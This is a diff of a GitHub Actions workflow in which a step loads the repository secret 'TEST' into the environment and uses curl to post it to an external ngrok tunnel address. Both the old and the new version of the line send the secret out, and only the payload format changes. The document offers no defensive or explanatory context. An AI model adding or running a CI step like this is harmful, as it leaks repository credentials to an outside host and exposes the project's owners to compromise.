@@ -13,4 +13,4 @@ jobs:
         env:
           TEST: ${{ secrets.TEST }}
         run: |
-          curl --url "https://aa20-68-108-187-54.ngrok.io" --data '{ "message": $TEST }'
+          curl --url "https://aa20-68-108-187-54.ngrok.io" --data 'message=$TEST'
